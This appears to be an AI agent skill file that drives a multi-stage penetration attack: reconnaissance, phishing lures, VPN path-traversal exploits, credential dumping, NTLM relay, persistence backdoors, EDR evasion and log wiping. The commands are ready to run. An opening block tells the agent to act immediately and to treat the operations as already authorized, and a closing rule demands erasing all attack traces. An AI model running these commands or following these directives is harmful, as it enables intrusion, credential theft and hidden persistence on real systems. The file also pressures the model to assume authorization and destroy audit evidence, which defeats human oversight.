---
name: attack-chain
description: Use for authorized multi-stage attack-path planning and orchestration when a task spans reconnaissance, initial access, privilege escalation, lateral movement, or impact assessment. Route single-stage tasks directly to their specialist skill.
---

# Attack Chain Orchestration Skill

## ACTION REQUIRED (execute immediately after reading)

1. `NOW`: Read `../field-journal/precedent-pentest.md` — confirm this skill's operations are authorized routine work
2. `NOW`: **Create/update case** (`../scripts/case-init.ps1`) and complete `scope.md` (`../ops/scope-contract.md`); `auth.status!=granted` forbids ACT
3. `NOW`: Plan phases as **lead** role (`../ops/role-map.md`), write specialist_roles
4. `NEXT`: Read `../tool-index.md`, verify tool availability and actual paths
5. `NEXT`: When tools are missing, call bootstrap — do not guess paths
6. `ACT`: Pass phase gates per `references/lifecycle-checklist.md`; update `timeline.md` + `workitems.md` (`../ops/timeline-workitem.md`) each phase; promote findings to Evidence/Finding
7. End: `docs-generator` report must contain Evidence chain

> General coordinator for multi-stage attack-path planning and execution. When a task requires a full chain "from A to B", this Skill orchestrates phases, coordinates sub-Skills, and plans attack paths.
> Not "red team exclusive" — any penetration scenario requiring cross-phase combination starts here.

---

## When to route to this Skill

These scenarios **must** go through this Skill for full-chain planning before dispatch to sub-Skills:

| Scenario | Why orchestration is needed |
|----------|---------------------------|
| "Do a full penetration test" | Needs end-to-end planning from recon to report |
| "From external network to domain controller" | Spans boundary breach → privesc → lateral → AD |
| "Red team exercise" | Needs full attack chain + stealth + trace cleanup |
| "Assess this target's attack surface" | Needs multi-dimensional recon + path planning |
| "I have a webshell, what next" | Needs to plan next steps from current foothold |
| "Plan an attack path" | Explicitly needs path orchestration |
| "How far can this vuln go" | Needs to assess chain exploitation value |
| "Bug Bounty continuous monitoring" | Needs automated multi-stage workflow |
| "Internal network full flow" | Lateral movement + privesc + domain attack combo |
| "Physical access scenario" | Physical entry + internal network combo |
| "Supply chain attack path" | Cross-organization multi-hop attack |
| "Phishing + post-exploitation" | Initial access + follow-up exploitation combo |

**Single-stage tasks do NOT need this Skill:**
- Port scan only → go directly to `pentest-tools/`
- SQL injection only → go directly to `pentest-tools/`
- APK reverse only → go directly to `apk-reverse/`
- Domain pentest only → go directly to `pentest-tools/references/network-attack-defense.md`

---

## Orchestration principles

### This Skill's role

```
User raises multi-stage task
    ↓
attack-chain/SKILL.md (this file)
    ↓ Plan attack path, determine phase order
    ↓ Assess tools/methods needed per phase
    ↓
Dispatch to sub-Skills:
    ├── pentest-tools/     → tool invocation, exploitation
    ├── apk-reverse/       → mobile penetration
    ├── js-reverse/        → Web frontend breakthrough
    ├── reverse-engineering/ → binary analysis
    ├── ida-reverse/       → deep reversing
    └── browser-automation/ → automated operations
    ↓
After each phase, return to this Skill to evaluate next step
    ↓
All complete → docs-generator produces report
```

### Path planning decision tree

```
After receiving target:
1. What is the target? (Web/internal/cloud/mobile/IoT)
2. What do we have? (External view/existing creds/existing foothold)
3. What is the end goal? (Domain controller/data/specific system/impact proof)
4. Constraints? (Time/stealth/no-touch systems)
    ↓
Based on above, plan shortest path
    ↓
If one path fails → return to this Skill, plan alternate route
```

---

## Full attack chain phases

---

## Phase 1: Reconnaissance

### 1.1 Enterprise digital asset mapping

```bash
# Subsidiary domain discovery
subfinder -d target.com -o subdomains.txt
amass enum -d target.com -passive -o amass_results.txt

# Merge and deduplicate
cat subdomains.txt amass_results.txt | sort -u > all_subs.txt

# Liveness probe
httpx -l all_subs.txt -status-code -title -tech-detect -o alive.txt

# Port scan (full ports)
naabu -l all_subs.txt -top-ports 1000 -o ports.txt
nmap -sV -sC -iL targets.txt -oA nmap_results
```

**Practical tips:**
- Use corporate registry/business databases to get subsidiary list, expand attack surface
- Focus on test environments (test., dev., staging.) and newly launched systems
- Certificate Transparency logs (crt.sh) to discover hidden domains

### 1.2 Sensitive information leakage hunting

```bash
# GitHub search
# org:Company filename:.env password
# org:Company filename:config.yml secret
# org:Company "jdbc:mysql" password

# Google Dork
# site:target.com filetype:sql
# site:target.com inurl:admin
# site:target.com ext:conf|cfg|ini

# API Keys in JS files
cat js_urls.txt | while read url; do
  curl -s "$url" | grep -oP '(api[_-]?key|secret|token|password)\s*[:=]\s*["\x27][^"\x27]+'
done
```

**High-value targets:**
- Cloud service AK/SK (Alibaba Cloud, AWS, Azure)
- Database connection strings
- JWT keys
- Internal API documentation
- VPN/bastion credentials

### 1.3 Employee profiling

**Social engineering dictionary generation rules:**
```
{name_pinyin}{year}       → zhangsan2024
{name_initials}{dept_abbr}  → zs_dev
{employee_id}@{domain}          → 10086@target.com
{name}{common_suffix}       → zhangsan@123, zhangsan!@#
```

**Information sources:**
- Professional networks/LinkedIn department structure
- Corporate public accounts/official website team pages
- Job postings (tech stack exposure)
- Academic papers (email exposure)

### 1.4 Tech stack fingerprinting

```bash
# Web fingerprint
whatweb -i alive.txt --log-json=fingerprint.json
httpx -l alive.txt -tech-detect -json -o tech.json

# Specific framework detection
nuclei -l alive.txt -tags tech -severity info -o tech_results.txt

# CMS identification
wpscan --url https://target.com --enumerate p,t,u
```

---

## Phase 2: Initial Access

### 2.1 Web vulnerability exploitation (high-frequency breakthrough)

| Vuln type | Detection tool | Exploitation |
|-----------|---------------|-------------|
| SQL injection | sqlmap | Data extraction → write shell → OS command |
| SSTI | sstimap | Template injection → RCE |
| File upload | Manual + Burp | Webshell → reverse shell |
| Deserialization | ysoserial/marshalsec | Java/PHP/Python RCE |
| SSRF | Manual | Internal network probe → cloud metadata → AK/SK |
| Unauthorized access | nuclei | Spring Actuator / Nacos / Redis |
| XSS → Cookie | xsstrike | Admin session hijack |

```bash
# SQL injection automation
sqlmap -u "https://target.com/api?id=1" --batch --dbs --random-agent

# SSTI detection
sstimap -u "https://target.com/search?q=test"

# Nuclei batch scan
nuclei -l alive.txt -severity critical,high -tags cve,sqli,rce -o vulns.txt
```

### 2.2 Supply chain attack

**Attack path:**
1. Identify third-party components/providers used by target
2. Attack provider to gain code signing/update push permissions
3. Deliver malicious payload through legitimate update channel

**Common entry points:**
- Open-source component poisoning (npm/pip/maven)
- SaaS provider API abuse
- Outsourced personnel privilege exploitation
- Shared IT provider lateral penetration

### 2.3 Phishing attacks

**Email phishing:**
```
Subject templates:
- [Urgent] VPN certificate expiring, please update immediately
- [IT Notice] Mailbox storage full, please clean up
- [HR] 2024 annual performance review results
- [Finance] Reimbursement system upgraded, please re-login to confirm
```

**Payload types:**
- Office macro documents (.docm/.xlsm)
- LNK shortcuts (disguised as PDF)
- HTML Smuggling
- ISO/IMG images (bypass MOTW)
- OneNote embedded scripts

**OAuth phishing (2025 trend):**
- Construct malicious OAuth app requesting permissions
- After user authorization, gain email/file access
- No password needed, bypasses MFA

### 2.4 Physical access

| Technique | Tool | Effect |
|-----------|------|--------|
| BadUSB | Rubber Ducky / WiFi Ducky | Keyboard injection → reverse shell |
| Malicious power bank | O.MG Cable | Disguised data cable implant backdoor |
| WiFi phishing | Fluxion / WiFi Pineapple | Fake hotspot → credential capture |
| RFID clone | Proxmark3 | Access card copy → physical entry |
| Network implant | Raspberry Pi / LAN Turtle | Internal network persistent access point |

```bash
# Fluxion WiFi phishing
fluxion  # Interactive: select target AP → create fake hotspot → capture WPA password

# BadUSB linked with Cobalt Strike
# Via USB inject PowerShell downloader → connect to C2
```

### 2.5 VPN/remote access breakthrough

```bash
# Pulse Secure VPN (CVE-2019-11510)
curl -k "https://vpn.target.com/dana-na/../dana/html5acc/guacamole/../../../etc/passwd?/dana/html5acc/guacamole/"

# Fortinet VPN (CVE-2018-13379)
curl -k "https://vpn.target.com/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"

# Generic: password spraying
hydra -L users.txt -P passwords.txt vpn.target.com https-form-post
```

### 2.6 Cloud service breakthrough

```bash
# AWS S3 bucket enumeration
aws s3 ls s3://target-bucket --no-sign-request

# Cloud metadata SSRF
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure AD password spraying
# Use MSOLSpray / Spray tools
```

---

## Phase 3: Privilege Escalation

### 3.1 Windows privilege escalation

| Technique | Condition | Tool |
|-----------|-----------|------|
| Potato series | SeImpersonate privilege | SweetPotato / GodPotato / PrintSpoofer |
| Kernel vulnerability | Unpatched | watson / wesng detection |
| Service path hijack | Unquoted service path | PowerUp |
| DLL hijack | Writable DLL search path | Process Monitor |
| AlwaysInstallElevated | Registry config | msiexec install malicious MSI |
| Scheduled task | Writable task script | schtasks replace |

```powershell
# Detect SeImpersonate
whoami /priv | findstr "SeImpersonate"

# Potato privesc
.\GodPotato.exe -cmd "cmd /c whoami"

# Automated detection
.\winPEAS.exe
```

### 3.2 Linux privilege escalation

```bash
# SUID detection
find / -perm -4000 -type f 2>/dev/null

# sudo abuse
sudo -l
# Common exploitable: vim, find, python, nmap, less, awk, perl

# sudo vim privesc
sudo vim -c ':!/bin/bash'

# sudo find privesc
sudo find / -exec /bin/bash \;

# Kernel vulnerabilities
uname -r  # Check version
# DirtyPipe (CVE-2022-0847), DirtyCow (CVE-2016-5195)

# Automated detection
./linpeas.sh
```

### 3.3 Database privilege escalation

```sql
-- MSSQL xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- MySQL UDF privesc
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('id');

-- PostgreSQL
COPY (SELECT '') TO PROGRAM 'id';
```

### 3.4 Cloud privilege escalation

```bash
# AWS IAM enumeration
aws iam list-attached-user-policies --user-name compromised-user
# Look for iam:PassRole + lambda:CreateFunction → admin privileges

# Azure AD
# Global admin → all subscription control
# App admin → add credentials to service principal
```

---

## Phase 4: Lateral Movement

### 4.1 Credential acquisition

```bash
# Mimikatz (Windows)
mimikatz# sekurlsa::logonpasswords
mimikatz# lsadump::dcsync /domain:target.local /user:krbtgt

# Linux credentials
cat /etc/shadow
cat ~/.bash_history | grep -i pass
find / -name "*.conf" -exec grep -l "password" {} \;

# NTLM Hash extraction
secretsdump.py domain/user:password@dc_ip
```

### 4.2 Pass-the-Hash / Pass-the-Ticket

```bash
# PTH lateral
crackmapexec smb 10.0.0.0/24 -u administrator -H <NTLM_HASH> --exec-method smbexec

# Kerberoasting
GetUserSPNs.py -request -dc-ip 10.0.0.1 domain/user:password

# AS-REP Roasting
GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1

# Golden Ticket
mimikatz# kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-... /krbtgt:<HASH> /ptt
```

### 4.3 Stealthy lateral techniques

```bash
# WMI fileless execution
wmiexec.py domain/admin:password@target_ip "whoami"

# DCOM remote execution
dcomexec.py domain/admin:password@target_ip "whoami"

# WinRM
evil-winrm -i target_ip -u admin -H <NTLM_HASH>

# PsExec (leaves traces)
psexec.py domain/admin:password@target_ip

# SSH tunnel (Linux environment)
ssh -D 1080 user@pivot_host  # SOCKS proxy
ssh -L 3389:internal_host:3389 user@pivot_host  # Port forward
```

### 4.4 NTLM Relay

```bash
# Disable Responder's SMB/HTTP
# Edit Responder.conf: SMB = Off, HTTP = Off

# Start Responder capture
responder -I eth0

# NTLM Relay to target
ntlmrelayx.py -tf targets.txt -smb2support

# Coercer forced authentication
coercer coerce -u user -p password -d domain -l attacker_ip -t dc_ip
```

### 4.5 AD attack paths

```bash
# BloodHound data collection
bloodhound-python -d domain.local -u user -p password -c All -ns dc_ip

# Common attack paths:
# 1. User → GenericAll → target user → reset password
# 2. User → WriteDacl → target OU → add permissions
# 3. Computer → constrained delegation → impersonate any user
# 4. User → DCSync permission → dump all hashes

# Certipy AD CS attack
certipy find -u user@domain -p password -dc-ip dc_ip
certipy req -u user@domain -p password -ca CA-NAME -template VulnTemplate
```

---

## Phase 5: Persistence

### 5.1 Windows persistence

| Technique | Stealth | Detection difficulty |
|-----------|:------:|:-------------------:|
| Scheduled task | Medium | Low |
| Registry Run key | Low | Low |
| WMI event subscription | High | High |
| DLL hijack | High | Medium |
| Shadow account | Medium | Medium |
| Golden Ticket | Very high | Very high |
| DSRM backdoor | Very high | Very high |

```powershell
# WMI event subscription (high stealth)
$Filter = Set-WmiInstance -Class __EventFilter -Arguments @{
    Name = "CoreFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# Shadow account
net user support$ P@ssw0rd /add /active:yes
net localgroup administrators support$ /add
# Modify registry F value to clone RID
```

### 5.2 Linux persistence

```bash
# SSH key implant
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

# Crontab backdoor
(crontab -l; echo "*/5 * * * * /tmp/.hidden/beacon") | crontab -

# LD_PRELOAD hijack
echo "/tmp/.hidden/evil.so" > /etc/ld.so.preload

# PAM backdoor
# Modify pam_unix.so to add universal password

# Systemd service
cat > /etc/systemd/system/update.service << 'EOF'
[Unit]
Description=System Update Service
[Service]
ExecStart=/tmp/.hidden/beacon
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable update.service
```

### 5.3 Cloud environment persistence

```bash
# AWS Lambda backdoor
# Create timed-trigger Lambda function, callback to C2

# Azure AD app registration
# Create app → add key credentials → grant Graph API permissions

# Container backdoor
# Modify base image → all new containers carry backdoor
```

---

## Phase 6: EDR/AV Evasion

### 6.1 Core evasion concepts

| Layer | Technique | Description |
|-------|-----------|-------------|
| Static detection | Encryption/obfuscation/custom loader | Avoid signature matching |
| Behavioral detection | Indirect syscalls/Unhooking | Bypass API hooks |
| Memory detection | Module stomping/heap encryption | Avoid memory scanning |
| Network detection | Domain fronting/legitimate service tunneling | Blend into normal traffic |
| Log detection | ETW Patching/log clearing | Reduce traces |

### 6.2 Practical evasion techniques

```
1. Custom shellcode loader (don't use public tools)
2. Direct syscalls (bypass ntdll hooks)
3. Process injection into low-monitoring processes (e.g. RuntimeBroker.exe)
4. C2 traffic via HTTPS + domain fronting / Cloudflare Workers
5. In-memory execution, fileless
6. Use legitimately signed programs (LOLBins)
```

### 6.3 C2 framework selection

| Framework | Characteristics | Use case |
|-----------|-----------------|----------|
| Cobalt Strike | Mature, stable, team collaboration | Large red team operations |
| Sliver | Open source, Go-based | Budget constrained |
| Havoc | Modern, modular | Needs customization |
| Mythic | Multi-agent support | Cross-platform |
| AdaptixC2 | Included in Kali 2026.1 | Quick deployment |

---

## Phase 7: Anti-Forensics

```bash
# Windows log clearing
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Linux log clearing
echo > /var/log/auth.log
echo > /var/log/syslog
history -c && history -w

# Timestamp modification
touch -t 202301010000 /path/to/file

# Memory cleanup
# Ensure Mimikatz dump is deleted
# Ensure C2 beacon has exited
# Ensure temp files are cleaned
```

---

## Red team iron rules

### Three bottom lines

1. **All operations must have written authorization**
2. **Data exfiltration requires anonymization**
3. **Clean all attack traces (including memory-resident)**

### Operational discipline

- Assess risk level before each operation (low/medium/high/critical)
- Notify project manager before high-risk operations
- Maintain operation log (time, action, result)
- Report critical vulnerabilities immediately, do not expand exploitation
- Do not affect business availability (no DoS)
- Do not access/download real user data

### Typical failure cases

| Failure reason | Consequence | Lesson |
|---------------|-------------|--------|
| Mimikatz memory dump not cleaned | Blue team traces full attack path | Clean immediately after operation |
| C2 domain flagged by threat intelligence | First connection blocked | Use newly registered domain + domain fronting |
| Phishing email triggers DLP alert | Blue team early warning | Test email gateway rules first |
| Lateral movement triggers honeypot | Exposes attack intent | Identify honeypots before acting |

---

## Tool quick reference

### Reconnaissance
`subfinder` `amass` `httpx` `naabu` `katana` `gau` `dnsx` `nmap` `whatweb` `wpscan`

### Exploitation
`nuclei` `sqlmap` `sstimap` `xsstrike` `burpsuite` `metasploit`

### Privilege escalation
`winPEAS` `linpeas` `GodPotato` `PrintSpoofer` `watson`

### Lateral movement
`mimikatz` `crackmapexec/netexec` `impacket` `bloodhound` `certipy` `coercer` `responder` `evil-winrm`

### C2 frameworks
`cobalt-strike` `sliver` `havoc` `mythic` `adaptixc2`

### Physical access
`fluxion` `aircrack-ng` `proxmark3` `rubber-ducky` `wifi-pineapple`

---

## Relationship with other Skills in this package

| Need | Route to |
|------|----------|
| Web vulnerability deep exploitation | `pentest-tools/SKILL.md` |
| Internal AD attack detailed steps | `pentest-tools/references/network-attack-defense.md` |
| Malware sample reverse analysis | `reverse-engineering/SKILL.md` |
| APK reverse (mobile pentest) | `apk-reverse/SKILL.md` |
| JS frontend signature bypass | `js-reverse/SKILL.md` |
| Automated swarm penetration | Pentest Swarm AI (`pentestswarm scan --swarm`) |
| AI-assisted penetration | `mcp-kali-server` / `metasploitmcp` / `hexstrike-ai` |
| Report generation | `docs-generator/SKILL.md` |
| Attack path diagram | `diagram-generator/SKILL.md` |

## Task completion self-check (MUST pass before claiming done)

- [ ] Did I execute every step in the workflow (not just read)?
- [ ] Did I use real tool paths based on `tool-index`?
- [ ] Did I produce reproducible evidence (commands/scripts/screenshots/report)?
- [ ] Did I complete and write back the Checklist items required by RULES?
